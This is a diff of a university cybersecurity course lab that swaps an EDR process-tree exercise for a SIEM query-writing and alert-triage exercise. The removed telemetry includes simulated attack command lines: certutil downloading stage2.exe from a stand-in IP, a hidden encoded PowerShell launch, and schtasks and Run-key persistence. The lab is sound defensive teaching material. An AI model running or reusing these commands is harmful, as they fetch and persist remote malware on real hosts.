@@ -1,22 +1,22 @@
-# Lab Activity: Module 06 - Endpoint Detection and Response
+# Lab Activity: Module 06 — SIEM and Log Analysis
 
-## Course: CIS-4332 Cyber Analyst | Texas Wesleyan University
+## Course: CIS-4332 Cyber Security Analysis
 
-## Instructor: Professor Nash
+## Texas Wesleyan University | Professor Nash
 
-## CySA+ CS0-003 Domain: Domain 1 - Security Operations (33%)
+## Certification Alignment: CompTIA CySA+ (CS0-003)
 
 ---
 
 ## Lab Overview
 
-In this lab you will analyze simulated EDR telemetry — process trees, timeline events, file operations, and registry changes — to identify attack patterns, classify malicious activity by ATT&CK technique, and recommend response actions. All telemetry data is provided within this document. No EDR software installation is required.
+In this lab you will perform hands-on SIEM analysis using provided log datasets and pre-built query environments. You will write SPL and KQL queries to detect attack patterns, analyze a noisy correlation rule and propose tuning changes, and evaluate a set of SIEM alerts to classify true positives and false positives.
 
-Total Points: 100
+All exercises use provided sample data or in-browser query sandboxes — no SIEM installation is required.
 
-Estimated Completion Time: 75-90 minutes
-
-Submission: Upload your completed Lab Report to the Canvas Module 06 Lab assignment.
+- Total Points: 100
+- Estimated Completion Time: 75–90 minutes
+- Submission: Upload your completed Lab Report to Canvas, Module 06 Lab assignment
 
 ---
 
@@ -24,245 +24,260 @@ Submission: Upload your completed Lab Report to the Canvas Module 06 Lab assignm
 
 By completing this lab you will be able to:
 
-- Analyze a process tree to identify suspicious parent-child execution chains
-- Recognize LOLBin abuse from command-line arguments and parent-process context
-- Identify persistence mechanisms in registry and scheduled task telemetry
-- Map endpoint attack behaviors to ATT&CK tactics and techniques
-- Recommend appropriate EDR response actions for a confirmed endpoint compromise
+- Write Splunk SPL queries to detect brute force and lateral movement patterns
+- Write Microsoft Sentinel KQL queries to surface authentication anomalies
+- Analyze correlation rule output and identify tuning improvements
+- Classify SIEM alerts as true positive, false positive, or requires investigation
+- Recommend specific log sources to add to a SIEM to fill detection gaps
 
 ---
 
-## Exercise 1: Process Tree Analysis (35 points)
+## Lab Environment Access
 
-### Exercise 1 Overview
+### Splunk Exercises (Exercises 1 and 2)
 
-The following process tree was captured by an EDR platform on endpoint WS-ACCTG-12, a Windows 10 workstation assigned to an accounts payable employee. The intrusion began at approximately 14:22 UTC on November 14, 2024. Review the complete process tree and answer the questions that follow.
+Use the Splunk Attack Range sandbox at `https://tryhackme.com` (TryHackMe "Splunk: Basics" and "Splunk 2" rooms) or the Splunk Boss of the SOC dataset at `https://bots.splunk.com`.
 
-### Process Tree — WS-ACCTG-12
+If sandbox access is unavailable, submit query screenshots from the Splunk free developer instance at `https://www.splunk.com/en_us/download/splunk-enterprise.html` (90-day free trial).
 
-```text
-[14:21:44]  explorer.exe (PID 1824)  [User: jdoe]
-    |
-    +-- [14:22:01]  OUTLOOK.EXE (PID 3312)  [User: jdoe]
-            |
-            +-- [14:22:47]  EXCEL.EXE (PID 4488)  [User: jdoe]
-                    |
-                    +-- [14:22:52]  cmd.exe (PID 5120)  [User: jdoe]
-                            |
-                            +-- [14:22:54]  powershell.exe (PID 5244)
-                            |       CommandLine: powershell.exe -NoProfile -NonInteractive
-                            |                   -WindowStyle Hidden
-                            |                   -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0A
-                            |
-                            +-- [14:23:11]  certutil.exe (PID 5399)
-                            |       CommandLine: certutil.exe -urlcache -f
-                            |                   http://198.51.100.47/stage2.exe
-                            |                   C:\Users\jdoe\AppData\Temp\svcmon.exe
-                            |
-                            +-- [14:23:14]  svcmon.exe (PID 5412)
-                                    |       Path: C:\Users\jdoe\AppData\Temp\svcmon.exe
-                                    |       Hash: a3f5b2c1d4e6a7b8c9d0e1f2a3b4c5d6
-                                    |       Network: 198.51.100.47:4444 [TCP ESTABLISHED]
-                                    |
-                                    +-- [14:23:19]  schtasks.exe (PID 5501)
-                                    |       CommandLine: schtasks /Create /SC MINUTE /MO 5
-                                    |                   /TN "WindowsSystemUpdate"
-                                    |                   /TR "C:\Users\jdoe\AppData\Temp\svcmon.exe"
-                                    |                   /RU jdoe
-                                    |
-                                    +-- [14:23:22]  whoami.exe (PID 5512)
-                                    +-- [14:23:23]  ipconfig.exe (PID 5514) [/all]
-                                    +-- [14:23:24]  net.exe (PID 5516) [user]
-                                    +-- [14:23:25]  net.exe (PID 5518) [localgroup administrators]
-                                    +-- [14:23:31]  arp.exe (PID 5522) [-a]
-```
+### KQL Exercises (Exercise 3)
 
-### Task 1A — Process Tree Annotation (15 points)
-
-For each of the seven suspicious process events listed below, identify: (1) why the process or its execution context is suspicious, and (2) the ATT&CK tactic and technique it represents. Answer in 2-3 sentences per entry.
-
-Entry to analyze: EXCEL.EXE spawning cmd.exe at 14:22:52
-
-Entry to analyze: powershell.exe with -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand at 14:22:54
-
-Entry to analyze: certutil.exe with -urlcache -f arguments at 14:23:11
-
-Entry to analyze: svcmon.exe executing from AppData\Temp\ at 14:23:14
-
-Entry to analyze: svcmon.exe establishing a TCP connection to 198.51.100.47:4444 at 14:23:14
-
-Entry to analyze: schtasks.exe creating task "WindowsSystemUpdate" at 14:23:19
-
-Entry to analyze: The sequence whoami, ipconfig, net user, net localgroup, arp at 14:23:22 to 14:23:31
-
-Scoring: 2 points per entry — 1 for accurate suspicious reason, 1 for correct ATT&CK tactic and technique.
-
-### Task 1B — Root Cause Identification (10 points)
-
-In 5-7 sentences, trace the full attack chain from initial access through post-compromise activity. Your narrative should:
-
-1. Identify the most likely initial access vector based on the process tree
-2. Explain what the attacker accomplished at each significant step
-3. Map the full chain to a sequence of ATT&CK tactics in chronological order
-4. Explain why this attack chain is likely to evade traditional antivirus
-
-### Task 1C — LOLBin Identification (10 points)
-
-Identify every LOLBin used in the process tree above. For each, state its normal purpose, describe how it was abused in this scenario, and identify the ATT&CK technique for its malicious use. Use the LOLBin reference table from the Reading Guide.
+Use the Microsoft Sentinel demo environment at `https://aka.ms/SentinelLab` or the Azure Log Analytics demo workspace at `https://aka.ms/lademo`.
 
 ---
 
-## Exercise 2: Registry and Persistence Analysis (25 points)
+## Exercise 1 — SPL Query Writing (35 points)
 
-### Exercise 2 Overview
+### Exercise 1 Background
 
-The EDR platform captured the following registry and file system events on the same endpoint during the 14:22-14:30 UTC window. Review the events and complete the tasks below.
+You are a Tier 1 analyst in a SOC. Your SIEM has just ingested Windows Security Event logs from the past 24 hours across the corporate domain. You need to write SPL queries to surface specific threat indicators.
 
-### Registry and File System Events
+Use the index `wineventlog` or `main` depending on your sandbox. All queries should target the time range `earliest=-24h`.
 
-```text
-[14:23:20]  REGISTRY WRITE
-    Key:   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-    Value: WindowsUpdateService
-    Data:  C:\Users\jdoe\AppData\Roaming\Updater\updater.exe
-    Actor: svcmon.exe (PID 5412)
+### Task 1A — Failed Login Analysis (10 points)
 
-[14:23:24]  FILE CREATE
-    Path:  C:\Users\jdoe\AppData\Roaming\Updater\updater.exe
-    Hash:  a3f5b2c1d4e6a7b8c9d0e1f2a3b4c5d6
-    Actor: svcmon.exe (PID 5412)
-    Note:  Hash matches svcmon.exe (same binary, different name)
+Write an SPL query that:
 
-[14:24:01]  FILE CREATE
-    Path:  C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\Start Menu\
-           Programs\Startup\svc_helper.lnk
-    Actor: svcmon.exe (PID 5412)
-    Note:  Shortcut targeting C:\Users\jdoe\AppData\Roaming\Updater\updater.exe
+1. Searches for failed logon events (EventCode 4625)
+2. Groups results by Account_Name and src_ip
+3. Returns only accounts with five or more failures
+4. Sorts results by failure count descending
+5. Displays columns: Account_Name, src_ip, failure_count
 
-[14:25:10]  REGISTRY WRITE
-    Key:   HKLM\SYSTEM\CurrentControlSet\Services\WinSystemMon
-    Value: ImagePath
-    Data:  C:\Users\jdoe\AppData\Temp\svcmon.exe
-    Actor: svcmon.exe (PID 5412)
-    Note:  Service creation requires elevation; this write succeeded unexpectedly
+Submit: The complete SPL query and a screenshot of the results table.
+
+Expected query structure:
+
+```spl
+index=wineventlog EventCode=4625 earliest=-24h
+| stats count as failure_count by Account_Name, src_ip
+| where failure_count >= 5
+| sort -failure_count
+| table Account_Name, src_ip, failure_count
 ```
 
-### Task 2A — Persistence Mechanism Identification (15 points)
+Scoring: 5 points for correct query logic; 5 points for screenshot showing non-empty results or documented explanation if dataset yields zero results.
 
-For each of the four events above, answer the following questions (3 points each, plus 3 points for Task 2A-5):
+### Task 1B — Brute Force with Successful Login (15 points)
 
-Task 2A-1: Identify the persistence technique represented by the HKCU Run key write. Name the ATT&CK technique ID and explain how this mechanism ensures the malicious binary executes at every user logon.
+Write an SPL query that:
 
-Task 2A-2: Identify the persistence technique represented by the Startup folder shortcut creation. Name the ATT&CK technique ID and explain how this mechanism differs from the Run key in terms of which user context it affects.
+1. Identifies accounts with five or more failed logins (EventCode 4625) within any two-minute window
+2. Correlates those accounts against successful logins (EventCode 4624) in the same hour
+3. Returns only accounts that appear in both result sets
+4. Displays: Account_Name, failure_count, successful_login_time
 
-Task 2A-3: Identify the persistence technique represented by the service creation attempt. Name the ATT&CK technique ID and explain what the note "requires elevation; this write succeeded unexpectedly" implies about the attacker's privilege level.
+Submit: The complete SPL query with explanation of each pipe stage (2–3 sentences per stage) and a screenshot of results.
 
-Task 2A-4: The file hash for updater.exe matches svcmon.exe. In 2-3 sentences, explain the security significance of the attacker using the same binary with different names in different locations.
+Scoring: 7 points for correct query; 8 points for accurate explanation of each query stage.
 
-Task 2A-5: Across all four events, how many distinct ATT&CK persistence techniques are represented? List each technique ID and name, and explain in one sentence why using multiple redundant persistence mechanisms benefits the attacker.
+### Task 1C — High-Volume Outbound Traffic (10 points)
 
-### Task 2B — Containment Decision (10 points)
+Write an SPL query using network flow data (index `netflow` or `network`) that:
 
-You have confirmed this is a true positive. You have EDR remote response capabilities available. In 5-6 sentences, describe your immediate containment actions in priority order. For each action, explain what it accomplishes and what investigation risk you accept by taking it. Address: network isolation, process termination, and the sequence in which you would perform these actions.
+1. Filters for outbound traffic only (direction=outbound or dest_ip not in RFC 1918 ranges)
+2. Sums bytes transferred per source IP per destination IP
+3. Returns only source/destination pairs exceeding 50 MB (52,428,800 bytes)
+4. Sorts by bytes descending
+
+Submit: The complete SPL query and screenshot. If your sandbox lacks network flow data, write the query with a comment explaining the expected dataset and submit the query code only for partial credit.
 
 ---
 
-## Exercise 3: UEBA Scenario Analysis (25 points)
+## Exercise 2 — Correlation Rule Tuning Analysis (30 points)
 
-### Exercise 3 Overview
+### Exercise 2 Background
 
-The following three behavioral alerts were generated by the UEBA component of the EDR platform. For each alert, analyze whether it represents a true security concern and recommend an action.
+The SOC manager has flagged the following correlation rule as "extremely noisy" — it is generating over 400 alerts per day, nearly all false positives. Review the rule definition and answer the analysis questions.
 
-### UEBA Alert 3-01
-
-```text
-User: sarah.johnson  (Finance Director)
-Alert: Significant Behavioral Deviation — Authentication
-Baseline: User authenticates exclusively from CORP-LT-045 (10.0.1.45)
-          Monday-Friday 08:00-18:30 CST. No after-hours logins in 14 months.
-Observed: Successful login at 02:14 AM CST on Saturday from source IP 10.0.9.88
-          (asset: TEMP-LAPTOP-003, a shared device in the conference room).
-          Following login: accessed CFO-SHARE (executive financial data) for 48 minutes.
-          Downloaded: 3 files totaling 847 MB.
-```
-
-### UEBA Alert 3-02
+### Rule Under Review
 
 ```text
-User: backup_svc (Service Account)
-Alert: Significant Behavioral Deviation — Source Location
-Baseline: backup_svc authenticates only from 10.0.5.10 (backup server)
-          and 10.0.5.11 (backup server secondary) between 01:00 and 04:00 UTC daily.
-Observed: Successful Kerberos authentication at 14:33 UTC from 10.0.4.88
-          (asset: WS-ACCTG-12 — same workstation from Exercise 1).
-          Followed by: SMB access to DOMAIN-CONTROLLER-01 at 14:34 UTC.
+Rule Name: Multiple Failed Logins — Any Account
+Platform: Splunk Enterprise Security
+Search:
+    index=wineventlog EventCode=4625
+    | bucket _time span=5m
+    | stats count as failures by _time, Account_Name
+    | where failures >= 2
+    | eval severity="high"
+
+Threshold: 2 failures in 5 minutes
+Severity: High
+Current alert volume: 412 per day
+Confirmed true positives last 90 days: 3
+Average analyst time per alert: 8 minutes
 ```
 
-### UEBA Alert 3-03
+### Task 2A — False Positive Root Cause Analysis (10 points)
 
-```text
-User: m.rodriguez  (Software Developer)
-Alert: Moderate Behavioral Deviation — Data Access Volume
-Baseline: User accesses DEV-SHARE and CODE-REPO daily.
-          Accesses HR-SHARE approximately once per quarter for 1-2 files.
-Observed: User accessed HR-SHARE today and downloaded 412 files over 2 hours.
-          Downloaded files are employee performance records and compensation data.
-Note: User submitted a resignation letter this morning. Manager confirmed in HR system.
-```
+In 5–7 sentences, identify at least three specific reasons why this rule generates an excessive number of false positives. Your analysis should address:
 
-### Task 3A — Alert Triage and Classification (15 points)
+- Why the threshold of two failures is inappropriate for most enterprise environments
+- What types of legitimate user behavior would routinely trigger this rule
+- What types of automated or system-generated activity would trigger this rule
 
-For each of the three UEBA alerts, answer the following in 4-6 sentences per alert (5 points each):
+### Task 2B — Tuning Recommendation (12 points)
 
-1. Is this alert more likely a true positive or false positive? Justify using the specific behavioral deviations described.
-2. What is the most likely explanation for the observed behavior — malicious, unauthorized, or legitimate?
-3. What one additional piece of evidence would most definitively confirm or rule out a malicious explanation?
+Propose a revised version of the rule that would significantly reduce false positives without eliminating true positive detection. Your answer must include:
 
-### Task 3B — UEBA vs. Rule-Based Detection Comparison (10 points)
+1. A revised SPL query implementing your tuning changes
+2. A written explanation of each change made (3–4 sentences per change)
+3. An explanation of any detection capability trade-offs your tuning introduces
 
-In 6-8 sentences, explain why UEBA Alert 3-02 would not have been detected by a standard SIEM rule-based detection system. Your answer should address: what field values a rules-based system would have evaluated, why those values appear legitimate, and what specific capability UEBA has that allows it to detect this event where rule-based systems cannot.
+Your revised rule should implement at least three of the following tuning techniques:
+
+- Raise the failure threshold
+- Add a time-bucketing window
+- Exclude known service accounts or scanner IPs
+- Correlate failures with a subsequent successful login
+- Add asset criticality context to severity
+
+### Task 2C — Operational Impact Calculation (8 points)
+
+Using the current rule statistics provided, calculate:
+
+1. The total analyst hours per day consumed by this rule (show your calculation)
+2. The true positive rate over the 90-day period (total TPs / total alerts; show your calculation assuming 412 alerts/day is consistent)
+3. Based on these numbers, justify in 3–4 sentences whether this rule should be retired, significantly retuned, or kept as-is
 
 ---
 
-## Exercise 4: Cross-Endpoint Scope Assessment (15 points)
+## Exercise 3 — KQL Query Writing in Microsoft Sentinel (20 points)
 
-### Exercise 4 Overview
+### Exercise 3 Background
 
-After confirming the compromise on WS-ACCTG-12, your team uses the EDR platform's cross-endpoint query capability to search for related indicators across the entire environment.
+Using the Azure Log Analytics demo workspace at `https://aka.ms/lademo`, write KQL queries against the `SecurityEvent` and `SigninLogs` tables.
 
-### Search Results
+### Task 3A — Privilege Escalation Detection (10 points)
 
-```text
-Query: file hash a3f5b2c1d4e6a7b8c9d0e1f2a3b4c5d6 across all endpoints
+Write a KQL query that:
 
-Results:
-- WS-ACCTG-12     jdoe            14:23:14  C:\Users\jdoe\AppData\Temp\svcmon.exe
-- WS-HR-07        k.thomas        14:45:02  C:\Users\k.thomas\AppData\Temp\svcmon.exe
-- WS-EXEC-03      ceo_assistant   15:12:44  C:\Users\ceo_assistant\Downloads\invoice_update.exe
-- LAPTOP-SALES-22 r.martinez      15:44:19  C:\Users\r.martinez\AppData\Local\Temp\svcmon.exe
+1. Finds accounts that received Event ID 4672 (Special Privileges Assigned) in the past 24 hours
+2. Joins against Event ID 4624 for the same account to verify a preceding logon
+3. Filters out accounts that are members of known admin groups (use `AccountType != "Machine"` as a proxy)
+4. Returns: Account, TimeGenerated, LogonType, IpAddress
 
-Query: scheduled task name "WindowsSystemUpdate" across all endpoints
+Submit: The complete KQL query and a screenshot of results.
 
-Results: WS-ACCTG-12, WS-HR-07, WS-EXEC-03, LAPTOP-SALES-22 (all four)
+Expected query pattern:
 
-Query: outbound connection to 198.51.100.47:4444
-
-Results: WS-ACCTG-12 (established), WS-HR-07 (established),
-         WS-EXEC-03 (connection attempt — blocked by firewall),
-         LAPTOP-SALES-22 (established)
+```kql
+SecurityEvent
+| where TimeGenerated > ago(24h)
+| where EventID == 4672
+| join kind=inner (
+    SecurityEvent
+    | where EventID == 4624
+    | where AccountType != "Machine"
+    | project Account, LogonTime=TimeGenerated, LogonType, IpAddress
+) on Account
+| project Account, PrivilegeTime=TimeGenerated, LogonTime, LogonType, IpAddress
+| order by PrivilegeTime desc
 ```
 
-### Task 4A — Scope Assessment (8 points)
+### Task 3B — Failed Authentication Summary Dashboard Query (10 points)
 
-Based on the search results, answer the following in 5-6 sentences:
+Write a KQL query suitable for a Sentinel Workbook visualization that:
 
-1. How many endpoints are confirmed compromised versus potentially compromised? Explain your classification.
-2. What does the WS-EXEC-03 "connection attempt blocked" result mean for the status of that endpoint?
-3. What does the variation in file names (svcmon.exe vs. invoice_update.exe) across endpoints tell you about how the initial access occurred on each system?
+1. Queries `SecurityEvent` for Event ID 4625 over the past 7 days
+2. Creates a time chart showing failed login attempts per hour
+3. Groups by Account to show top 10 accounts with most failures
+4. Outputs results suitable for a bar chart visualization
 
-### Task 4B — Incident Scope and Response Prioritization (7 points)
+Submit: The complete KQL query, a screenshot of the visualization, and a 3–4 sentence explanation of what the chart reveals about authentication health.
 
-In 4-5 sentences, prioritize the four endpoints for containment and explain your ordering. Consider: which systems have active C2 connections, which have the highest asset criticality based on user role, and whether isolating a system in network isolation would disrupt critical business operations.
+---
+
+## Exercise 4 — Alert Triage and Classification (15 points)
+
+### Exercise 4 Background
+
+Review the five SIEM alerts below and classify each as: True Positive (TP), False Positive (FP), or Requires Further Investigation (RFI). Provide a 3–4 sentence justification for each classification.
+
+### Alert 4-01
+
+```text
+Rule: Brute Force — Domain Admin Account
+Account: administrator@corp.local
+Failed logins: 47 in 3 minutes from 10.0.9.12
+Followed by: Successful login at 14:23:44 from same IP
+Asset 10.0.9.12: Developer workstation — jsmith
+User jsmith: Has never previously logged into administrator account
+```
+
+Classification and justification:
+
+### Alert 4-02
+
+```text
+Rule: High Volume Outbound Transfer
+Source: backup-server-01 (10.0.5.10)
+Destination: 203.0.113.45 (external IP — classified as backup cloud provider)
+Transfer: 4.2 GB between 02:00 and 04:00 AM
+Scheduled backup window: 01:00 to 05:00 AM daily
+Historical pattern: Same transfer volume and destination 6 days per week for 18 months
+```
+
+Classification and justification:
+
+### Alert 4-03
+
+```text
+Rule: New Local Admin Account Created
+Event: EventID 4720 — new account "svc_winmon" created on WS-ACCTG-04
+Created by: jdoe (standard accounts-payable user — no admin privileges documented)
+Time: 14:47 UTC on Tuesday
+IT change tickets: No change ticket for this account creation found
+```
+
+Classification and justification:
+
+### Alert 4-04
+
+```text
+Rule: Impossible Travel
+User: m.chen@corp.local
+Login 1: 08:15 AM — Chicago, IL (corporate office VPN — expected)
+Login 2: 09:02 AM — London, UK (47 minutes later)
+Note: m.chen is a global account manager who travels internationally weekly
+HR record: m.chen had a London client meeting scheduled this week
+```
+
+Classification and justification:
+
+### Alert 4-05
+
+```text
+Rule: DNS Query Volume Anomaly
+Source: WS-FINANCE-09
+Queries in 1 hour: 8,441 unique subdomains under the domain "updates-cdn-service.net"
+Historical baseline: average 80 unique DNS queries per hour for this host
+Domain age (VirusTotal): registered 3 days ago
+Domain reputation: 0/86 vendors flag as malicious (no reputation yet)
+```
+
+Classification and justification:
 
 ---
 
@@ -270,28 +285,29 @@ In 4-5 sentences, prioritize the four endpoints for containment and explain your
 
 | Exercise | Points | Grading Criteria |
 |---|---|---|
-| Exercise 1A — Process Tree Annotation | 15 | 2 pts per entry; correct suspicious reason and ATT&CK mapping |
-| Exercise 1B — Root Cause Identification | 10 | Complete chain; ATT&CK tactic sequence; AV evasion explanation |
-| Exercise 1C — LOLBin Identification | 10 | All LOLBins named; normal vs. malicious use; technique IDs correct |
-| Exercise 2A — Persistence Analysis | 15 | Correct technique IDs; elevation implication; redundancy reasoning |
-| Exercise 2B — Containment Decision | 10 | Priority order justified; investigation risk acknowledged for each action |
-| Exercise 3A — UEBA Alert Triage | 15 | Correct TP/FP classification; most likely explanation; confirming evidence identified |
-| Exercise 3B — UEBA vs. Rule-Based | 10 | Specific field analysis; correct UEBA advantage explained |
-| Exercise 4A — Scope Assessment | 8 | Correct confirmed vs. potential classification; blocked-attempt interpretation |
-| Exercise 4B — Prioritization | 7 | Logical prioritization; asset criticality and C2 status considered |
+| 1A — Failed Login SPL | 10 | Correct query logic; screenshot submitted |
+| 1B — Brute Force SPL | 15 | Correct correlation query; clear stage explanation |
+| 1C — Outbound Traffic SPL | 10 | Correct query; network data explanation if unavailable |
+| 2A — Root Cause Analysis | 10 | Three accurate FP reasons identified with explanation |
+| 2B — Tuning Recommendation | 12 | Revised query; three tuning techniques; trade-off discussed |
+| 2C — Operational Impact | 8 | Correct calculations shown; justified recommendation |
+| 3A — Privilege Escalation KQL | 10 | Correct join query; screenshot submitted |
+| 3B — Dashboard KQL | 10 | Correct timechart query; visualization; health interpretation |
+| 4 — Alert Triage (5 alerts) | 15 | 3 pts each: correct TP/FP/RFI classification + justification |
 | Total | 100 | |
 
 ---
 
 ## Submission Instructions
 
-1. Use the Lab Report Template from Canvas or a clearly labeled document matching this lab's section structure.
+1. Use a clearly labeled document matching this lab's section structure.
 2. Include your full name, student ID, course section, and submission date.
-3. Present any command-line examples in code-formatted blocks.
-4. Submit to the Canvas Module 06 Lab assignment by the posted deadline.
+3. Present all queries in fenced code blocks.
+4. Include screenshots for all tasks that require them.
+5. Submit to the Canvas Module 06 Lab assignment by the posted deadline.
 
 ---
 
 ## Academic Integrity Notice
 
-All EDR telemetry in this lab is fabricated for educational purposes. All work must be your own. Reference professormesser.com and comptia.org for additional study context.
+All log data and alert examples in this lab are fabricated for educational purposes. All work must be your own. Do not share query solutions in public forums. Reference `comptia.org` and `professormesser.com` for additional study context.
